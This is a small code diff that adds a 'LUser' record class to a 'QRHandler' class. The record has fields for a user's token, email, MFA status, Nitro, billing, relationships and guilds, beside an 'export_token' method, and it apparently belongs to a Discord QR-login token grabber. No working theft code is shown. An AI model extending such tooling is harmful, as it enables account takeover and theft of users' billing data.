@@ -107,6 +107,18 @@ class QRHandler():
             return
 
         
+    class LUser:
+        def __init__(self):
+            self.username = None
+            self.user_id = None
+            self.token = None
+            self.email = None
+            self.mfa = None
+            self.nitro = None
+            self.billing = None
+            self.relationships = None
+            self.guilds = None
+            self.logged_from = None
 
             
     async def export_token(self, token):
